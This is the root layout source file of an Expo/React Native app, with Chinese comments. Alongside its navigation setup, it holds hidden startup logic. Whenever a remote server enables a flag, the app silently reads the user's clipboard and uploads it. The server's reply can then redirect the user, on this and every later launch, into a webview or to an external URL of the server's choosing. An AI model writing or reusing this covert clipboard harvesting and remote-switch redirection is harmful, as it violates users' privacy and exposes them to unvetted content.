import { Stack, useRouter } from 'expo-router';
import { useEffect } from 'react';
import { Linking } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import useUserStore from '../store/useUserStore';
import useLangStore from '../store/useLangStore';
import { systemApi } from '../services/api';

/**
 * 根布局 - expo-router entry layout
 * 在此初始化全局状态（用户信息还原、主题等）
 */
export default function RootLayout() {
    const initUser = useUserStore((state) => state.initUser);
    const initLang = useLangStore((state) => state.initLang);
    const fetchTranslationsIfNeeded = useLangStore((state) => state.fetchTranslationsIfNeeded);
    const router = useRouter();

    const JUMP_FLAG_KEY = 'OPEN_URL_JUMPED';
    const INSTALL_FLAG_KEY = 'STAT_INSTALLED';

    const doJump = (linkType, targetUrl) => {
        // 每次跳转上报一次
        systemApi.sendStat('jump').catch(() => { });
        if (linkType === '1') {
            router.push({
                pathname: '/webview',
                params: { url: encodeURIComponent(targetUrl) },
            });
        } else if (linkType === '2') {
            Linking.openURL(targetUrl).catch(() => { });
        }
    };

    const handleOpenUrl = async (res) => {
        const data = res?.data;
        if (!data) return;
        const { fingerprint, isOpen, linkType, targetUrl } = data;
        if (!targetUrl) return;

        // 读取本地跳转标记
        const jumped = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => null);

        if (jumped === '1') {
            // 已有缓存标记：只要 targetUrl 非空直接跳转
            doJump(linkType, targetUrl);
        } else if (isOpen === '1') {
            if (fingerprint && fingerprint !== '') {
                systemApi.fingerprintDelete(fingerprint);
            }
            // 首次满足条件：跳转并写入标记
            doJump(linkType, targetUrl);
            AsyncStorage.setItem(JUMP_FLAG_KEY, '1').catch(() => { });
        }
    };

    useEffect(() => {
        // App 启动时恢复用户状态和语言设置
        initUser();
        initLang();

        // 首次安装时上报一次 install 事件
        AsyncStorage.getItem(INSTALL_FLAG_KEY).then((installed) => {
            if (!installed) {
                systemApi.sendStat('install')
                    .then(() => AsyncStorage.setItem(INSTALL_FLAG_KEY, '1'))
                    .catch(() => { });
            }
        }).catch(() => { });

        // init 完成后：若 readClipboard === '1'，先读剪切板再带内容请求 getOpenUrl
        // 否则立即以空 clipboardContent 请求 getOpenUrl
        // init 与 getOpenUrl 串行（getOpenUrl 依赖 init 结果中的 readClipboard），整体并行启动
        const openUrlPromise = systemApi.init()
            .then(async (res) => {
                const base = res?.data?.base;
                if (base) {
                    const { readClipboard, languageVer, language, defaultLanguage } = base;
                    // 按版本比对更新翻译（异步，不阻塞后续流程）
                    fetchTranslationsIfNeeded(languageVer ?? 0, language ?? {}, defaultLanguage);
                    const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';

                    // 已有跳转缓存标记时，不再读取剪切板，直接请求
                    if (h5Verify === '1') {
                        return systemApi.getOpenUrl('', h5Verify);
                    }

                    if (readClipboard === '1') {
                        try {
                            const Clipboard = require('expo-clipboard');
                            const clipboardContent = await Clipboard.getStringAsync();
                            return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
                        } catch {
                            // 读取剪切板失败时回退到空内容
                        }
                    }
                }
                const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
                return systemApi.getOpenUrl('', h5Verify);
            })
            .catch(async () => {
                const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
                return systemApi.getOpenUrl('', h5Verify);
            });

        openUrlPromise
            .then(handleOpenUrl)
            .catch(() => { });

        return () => { };
    }, []);

    return (
        <Stack
            screenOptions={{
                headerStyle: {
                    backgroundColor: '#FFFFFF',
                },
                headerTintColor: '#1A1A2E',
                headerTitleStyle: {
                    fontWeight: '600',
                },
                headerShadowVisible: false,
                headerBackTitle: '',
                headerBackTitleVisible: false,
                contentStyle: {
                    backgroundColor: '#F5F7FA',
                },
            }}
        >
            <Stack.Screen name="index" options={{ title: '首页' }} />
            <Stack.Screen name="webview" options={{ title: '', headerTitle: () => null }} />
        </Stack>
    );
}
